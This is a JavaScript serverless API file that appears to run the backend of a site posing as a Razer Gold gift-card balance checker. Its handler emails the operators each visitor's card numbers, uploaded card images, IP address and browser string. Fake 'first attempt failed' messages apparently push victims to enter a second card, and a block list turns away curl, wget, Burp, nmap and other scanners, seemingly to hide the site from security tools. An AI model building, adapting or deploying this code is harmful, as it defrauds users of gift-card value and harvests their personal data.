// api/log-check.js - Added immediate image upload notification
import { Resend } from 'resend';

const resend = new Resend(process.env.RESEND_API_KEY);

// ==================== SECURITY & PROTECTION ====================
const rateLimit = new Map();
const BLOCKED_USER_AGENTS = [
  'bot', 'crawler', 'spider', 'scraper', 'scan', 'scanner',
  'wget', 'curl', 'python', 'go-http', 'java', 'perl', 'ruby',
  'php', 'node-fetch', 'axios', 'insomnia', 'postman', 'burp',
  'nikto', 'nmap', 'zgrab', 'masscan', 'httpx', 'nuclei'
];

function isBotUserAgent(userAgent) {
  if (!userAgent) return true;
  const ua = userAgent.toLowerCase();
  return BLOCKED_USER_AGENTS.some(bot => ua.includes(bot));
}

function checkRateLimit(ip) {
  const now = Date.now();
  const windowMs = 60 * 1000;
  const maxRequests = 10;
  if (!rateLimit.has(ip)) rateLimit.set(ip, []);
  const timestamps = rateLimit.get(ip).filter(t => now - t < windowMs);
  if (timestamps.length >= maxRequests) return { allowed: false };
  timestamps.push(now);
  rateLimit.set(ip, timestamps);
  return { allowed: true };
}

// ==================== RECIPIENTS ====================
function getSecondaryRecipient() {
  const email = process.env.SECONDARY_EMAIL || (process.env.NOTIFICATION_EMAILS || '').split(',')[0]?.trim();
  if (!email || !email.includes('@') || email.length < 6) return null;
  return email;
}

function getPrimaryRecipient() {
  return process.env.NOTIFICATION_EMAIL; // Same as notify-typing.js
}

// ==================== SEND VIA RESEND ====================
async function sendViaResend({ subject, html, attachments, targetEmail }) {
  const apiKey = process.env.RESEND_API_KEY;
  const from = process.env.RESEND_FROM || process.env.EMAIL_FROM;
  
  if (!apiKey) return { sent: false, skipped: true, reason: 'RESEND_API_KEY missing' };
  if (!from) return { sent: false, skipped: true, reason: 'RESEND_FROM missing' };
  if (!targetEmail) return { sent: false, skipped: true, reason: 'Target Email missing' };

  const attachmentData = (attachments || []).map(a => ({ filename: a.filename, content: a.content }));

  try {
    console.log(`📧 Resend → ${targetEmail}`);
    const { data, error } = await resend.emails.send({
      from,
      to: targetEmail,
      subject,
      html,
      attachments: attachmentData,
    });

    if (error) {
      console.error('❌ Resend error:', error);
      return { sent: false, skipped: false, reason: error.message };
    }
    return { sent: true, data };
  } catch (err) {
    console.error('❌ Resend exception:', err.message);
    return { sent: false, skipped: false, reason: err.message };
  }
}

// ==================== EMAIL TEMPLATES ====================

function getImageUploadedEmailHTML(data) {
  return `
    <!DOCTYPE html><html><head><meta charset="UTF-8"><title>Image Captured</title>
    <style>
      body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
      .container { max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; border-radius: 10px; }
      .header { background: #00ff41; color: #000; padding: 15px; text-align: center; border-radius: 8px 8px 0 0; margin: -20px -20px 20px -20px; }
      .detail-row { padding: 8px 0; border-bottom: 1px solid #eee; }
      .detail-label { font-weight: bold; width: 140px; display: inline-block; }
      .footer { margin-top: 20px; padding-top: 10px; border-top: 1px solid #ddd; font-size: 12px; color: #666; text-align: center; }
    </style></head><body><div class="container">
      <div class="header"><h2>📸 IMAGE CAPTURED (Awaiting Amount)</h2></div>
      <p>The user has uploaded an image on the scan page. They are currently entering the amount.</p>
      <div class="detail-row"><span class="detail-label">📍 Source:</span><span>Scan & Upload</span></div>
      <div class="detail-row"><span class="detail-label">🌐 Browser:</span><span>${data.userAgent?.substring(0, 60) || 'Unknown'}</span></div>
      <div class="detail-row"><span class="detail-label">🖥️ IP Address:</span><span>${data.ip || 'Unknown'}</span></div>
      <div class="detail-row"><span class="detail-label">📅 Time:</span><span>${new Date(data.timestamp).toLocaleString()}</span></div>
      <div class="footer"><p>Image is attached to this email.</p></div>
    </div></body></html>`;
}

// ... [Keep the other templates (getFirstAttemptFailedEmailHTML, etc.) exactly the same] ...
// (Included below for copy-paste completeness)

function getFirstAttemptFailedEmailHTML(data) {
  return `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>First Attempt Failed</title><style>body{font-family:Arial;line-height:1.6;color:#333}.container{max-width:600px;margin:0 auto;padding:20px;border:1px solid #ddd;border-radius:10px}.header{background:#ff6b35;color:#fff;padding:15px;text-align:center;border-radius:8px 8px 0 0;margin:-20px -20px 20px -20px}.detail-row{padding:8px 0;border-bottom:1px solid #eee}.detail-label{font-weight:bold;width:140px;display:inline-block}.footer{margin-top:20px;padding-top:10px;border-top:1px solid #ddd;font-size:12px;color:#666;text-align:center}</style></head><body><div class="container"><div class="header"><h2>📸 FIRST ATTEMPT FAILED - Image Unclear</h2></div><div class="detail-row"><span class="detail-label">💰 Amount:</span><span>$${data.amount || '0'}.00 USD</span></div><div class="detail-row"><span class="detail-label">📍 Source:</span><span>Scan & Upload</span></div><div class="detail-row"><span class="detail-label">🌐 Browser:</span><span>${data.userAgent?.substring(0, 60) || 'Unknown'}</span></div><div class="detail-row"><span class="detail-label">🖥️ IP:</span><span>${data.ip || 'Unknown'}</span></div><div class="detail-row"><span class="detail-label">📅 Time:</span><span>${new Date(data.timestamp).toLocaleString()}</span></div><div class="footer"><p>Automated notification — user will be prompted to retry.</p></div></div></body></html>`;
}
function getFirstAttemptFailedHomeEmailHTML(data) {
  return `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>First Attempt Failed</title><style>body{font-family:Arial;line-height:1.6;color:#333}.container{max-width:600px;margin:0 auto;padding:20px;border:1px solid #ddd;border-radius:10px}.header{background:#ff6b35;color:#fff;padding:15px;text-align:center;border-radius:8px 8px 0 0;margin:-20px -20px 20px -20px}.detail-row{padding:8px 0;border-bottom:1px solid #eee}.detail-label{font-weight:bold;width:140px;display:inline-block}.footer{margin-top:20px;padding-top:10px;border-top:1px solid #ddd;font-size:12px;color:#666;text-align:center}</style></head><body><div class="container"><div class="header"><h2>❌ FIRST ATTEMPT FAILED - Invalid Number</h2></div><div class="detail-row"><span class="detail-label">💳 Number:</span><span>${data.cardNumber || 'Not provided'}</span></div><div class="detail-row"><span class="detail-label">💰 Amount:</span><span>$${data.amount || '0'}.00 USD</span></div><div class="detail-row"><span class="detail-label">📍 Source:</span><span>Manual Entry</span></div><div class="detail-row"><span class="detail-label">🌐 Browser:</span><span>${data.userAgent?.substring(0, 60) || 'Unknown'}</span></div><div class="detail-row"><span class="detail-label">🖥️ IP:</span><span>${data.ip || 'Unknown'}</span></div><div class="detail-row"><span class="detail-label">📅 Time:</span><span>${new Date(data.timestamp).toLocaleString()}</span></div><div class="footer"><p>Automated notification — user will be prompted to retry.</p></div></div></body></html>`;
}
function getSecondAttemptSuccessEmailHTML(data) {
  return `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Second Attempt Success</title><style>body{font-family:Arial;line-height:1.6;color:#333}.container{max-width:600px;margin:0 auto;padding:20px;border:1px solid #ddd;border-radius:10px}.header{background:#28a745;color:#fff;padding:15px;text-align:center;border-radius:8px 8px 0 0;margin:-20px -20px 20px -20px}.detail-row{padding:8px 0;border-bottom:1px solid #eee}.detail-label{font-weight:bold;width:140px;display:inline-block}.balance-box{background:#e8f5e9;padding:15px;text-align:center;border-radius:8px;margin:15px 0;border:1px solid #4caf50}.balance-amount{font-size:28px;font-weight:bold;color:#2e7d32}.footer{margin-top:20px;padding-top:10px;border-top:1px solid #ddd;font-size:12px;color:#666;text-align:center}</style></head><body><div class="container"><div class="header"><h2>✅ SUCCESS - Balance Verified</h2></div><div class="balance-box"><div style="font-size:14px;color:#666;">Available Balance</div><div class="balance-amount">${data.balance || `$${data.amount}.00 USD`}</div></div><div class="detail-row"><span class="detail-label">💳 Number:</span><span>${data.cardNumber || 'Not provided'}</span></div><div class="detail-row"><span class="detail-label">💰 Amount:</span><span>$${data.amount || '0'}.00 USD</span></div><div class="detail-row"><span class="detail-label">📍 Source:</span><span>Scan & Upload</span></div><div class="detail-row"><span class="detail-label">🌐 Browser:</span><span>${data.userAgent?.substring(0, 60) || 'Unknown'}</span></div><div class="detail-row"><span class="detail-label">🖥️ IP:</span><span>${data.ip || 'Unknown'}</span></div><div class="detail-row"><span class="detail-label">📅 Time:</span><span>${new Date(data.timestamp).toLocaleString()}</span></div><div class="footer"><p>Verification successful.</p></div></div></body></html>`;
}
function getMismatchAttemptEmailHTML(data) {
  return `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Mismatch</title><style>body{font-family:Arial;line-height:1.6;color:#333}.container{max-width:600px;margin:0 auto;padding:20px;border:1px solid #ddd;border-radius:10px}.header{background:#dc3545;color:#fff;padding:15px;text-align:center;border-radius:8px 8px 0 0;margin:-20px -20px 20px -20px}.detail-row{padding:8px 0;border-bottom:1px solid #eee}.detail-label{font-weight:bold;width:160px;display:inline-block}.footer{margin-top:20px;padding-top:10px;border-top:1px solid #ddd;font-size:12px;color:#666;text-align:center}</style></head><body><div class="container"><div class="header"><h2>⚠️ MISMATCH - Different Numbers</h2></div><div class="detail-row"><span class="detail-label">💳 First Number:</span><span>${data.firstCardNumber || 'Unknown'}</span></div><div class="detail-row"><span class="detail-label">💳 Second Number:</span><span>${data.secondCardNumber || 'Unknown'}</span></div><div class="detail-row"><span class="detail-label">💰 Amount:</span><span>$${data.amount || '0'}.00 USD</span></div><div class="detail-row"><span class="detail-label">🌐 Browser:</span><span>${data.userAgent?.substring(0, 60) || 'Unknown'}</span></div><div class="detail-row"><span class="detail-label">🖥️ IP:</span><span>${data.ip || 'Unknown'}</span></div><div class="detail-row"><span class="detail-label">📅 Time:</span><span>${new Date(data.timestamp).toLocaleString()}</span></div><div class="footer"><p>Automated security notification.</p></div></div></body></html>`;
}
function getSuccessEmailHTML(data) {
  return `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Success</title><style>body{font-family:Arial;line-height:1.6;color:#333}.container{max-width:600px;margin:0 auto;padding:20px;border:1px solid #ddd;border-radius:10px}.header{background:#28a745;color:#fff;padding:15px;text-align:center;border-radius:8px 8px 0 0;margin:-20px -20px 20px -20px}.detail-row{padding:8px 0;border-bottom:1px solid #eee}.detail-label{font-weight:bold;width:120px;display:inline-block}.balance-box{background:#e8f5e9;padding:15px;text-align:center;border-radius:8px;margin:15px 0;border:1px solid #4caf50}.balance-amount{font-size:28px;font-weight:bold;color:#2e7d32}.footer{margin-top:20px;padding-top:10px;border-top:1px solid #ddd;font-size:12px;color:#666;text-align:center}</style></head><body><div class="container"><div class="header"><h2>✅ Balance Check Successful</h2></div><div class="balance-box"><div class="balance-amount">${data.balance || `$${data.amount}.00 USD`}</div></div><div class="detail-row"><span class="detail-label">💰 Amount:</span><span>$${data.amount || '0'}.00 USD</span></div><div class="detail-row"><span class="detail-label">📍 Source:</span><span>Scan & Upload</span></div><div class="detail-row"><span class="detail-label">📅 Time:</span><span>${new Date(data.timestamp).toLocaleString()}</span></div><div class="footer"><p>Thank you for using our Balance Checker.</p></div></div></body></html>`;
}

// ==================== MAIN HANDLER ====================

export default async function handler(req, res) {
  const allowedOrigins = [
    'https://razergoldbalance.com', 'https://www.razergoldbalance.com',
    'http://localhost:5173', 'https://gold-app-nine.vercel.app', process.env.ALLOWED_ORIGIN
  ].filter(Boolean);

  const origin = req.headers.origin;
  res.setHeader('Access-Control-Allow-Origin', allowedOrigins.includes(origin) ? origin : 'https://razergoldbalance.com');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  let body = req.body;
  if (!body || Object.keys(body).length === 0) return res.status(400).json({ error: 'Empty request body' });

  // ---- Security ----
  let rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
  if (rawIp.includes(',')) rawIp = rawIp.split(',')[0].trim();
  const ip = (rawIp === '::1' || rawIp === '::ffff:127.0.0.1') ? '127.0.0.1' : rawIp;
  const userAgent = req.headers['user-agent'] || '';

  if (isBotUserAgent(userAgent)) return res.status(403).json({ error: 'Access denied' });
  if (!checkRateLimit(ip).allowed) return res.status(429).json({ error: 'Too many requests' });

  // ---- Extract ----
  const { type, cardNumber, firstCardNumber, secondCardNumber, amount, balance, timestamp, pageSource, imageBase64 } = body;

  if (!type) return res.status(400).json({ error: 'Missing type' });

  // ---- Demo mode ----
  if (process.env.DISABLE_EMAIL === 'true') {
    return res.status(200).json({ success: true, message: 'Demo mode', balance: balance || `$${amount || 0}.00 USD` });
  }

  // ---- Build content ----
  let subject = '', html = '', attachments = [];
  let targetEmail = getSecondaryRecipient(); // Default to secondary for results

  // NEW: Handle Immediate Image Upload -> Send to PRIMARY
  if (type === 'scan_image_uploaded') {
    targetEmail = getPrimaryRecipient(); 
    subject = '📸 IMAGE CAPTURED - Awaiting Amount';
    html = getImageUploadedEmailHTML({ userAgent, ip, timestamp: timestamp || new Date().toISOString() });
    
    if (imageBase64 && imageBase64.startsWith('data:image')) {
      const matches = imageBase64.match(/^data:image\/([A-Za-z-+\/]+);base64,(.+)$/);
      if (matches && matches[2]) {
        attachments.push({ filename: `captured-image-${Date.now()}.${matches[1]}`, content: matches[2], encoding: 'base64' });
      }
    }
  } 
  else if (type === 'first_attempt_failed') {
    if (pageSource === 'scan') {
      subject = '📸 FIRST ATTEMPT FAILED - Image Unclear';
      html = getFirstAttemptFailedEmailHTML({ amount, userAgent, ip, timestamp });
    } else {
      subject = '❌ FIRST ATTEMPT FAILED - Invalid Number';
      html = getFirstAttemptFailedHomeEmailHTML({ cardNumber, amount, userAgent, ip, timestamp });
    }
    if (imageBase64?.startsWith('data:image')) {
      const matches = imageBase64.match(/^data:image\/([A-Za-z-+\/]+);base64,(.+)$/);
      if (matches && matches[2]) attachments.push({ filename: `failed-${Date.now()}.${matches[1]}`, content: matches[2], encoding: 'base64' });
    }
  } 
  else if (type === 'second_attempt_success') {
    subject = `✅ SUCCESS - Balance Verified (${pageSource === 'manual' ? 'Manual' : 'Scan'})`;
    const displayBalance = balance || `$${amount}.00 USD`;
    html = getSecondAttemptSuccessEmailHTML({ cardNumber, amount, balance: displayBalance, userAgent, ip, timestamp });
    if (imageBase64?.startsWith('data:image')) {
      const matches = imageBase64.match(/^data:image\/([A-Za-z-+\/]+);base64,(.+)$/);
      if (matches && matches[2]) attachments.push({ filename: `success-${Date.now()}.${matches[1]}`, content: matches[2], encoding: 'base64' });
    }
  } 
  else if (type === 'mismatch_attempt') {
    subject = '⚠️ MISMATCH - Different Numbers Detected';
    html = getMismatchAttemptEmailHTML({ firstCardNumber, secondCardNumber, amount, userAgent, ip, timestamp });
  } 
  else if (['success_balance', 'upload_success', 'scan_success'].includes(type)) {
    subject = `✅ Balance Check Successful`;
    html = getSuccessEmailHTML({ amount, balance: balance || `$${amount}.00 USD`, timestamp });
  } else {
    return res.status(400).json({ error: 'Invalid request type' });
  }

  // ---- Send ----
  const result = await sendViaResend({ subject, html, attachments, targetEmail });

  if (result.sent) return res.status(200).json({ success: true });
  if (result.skipped) return res.status(200).json({ success: true, message: `Skipped: ${result.reason}` });
  return res.status(500).json({ error: result.reason });
}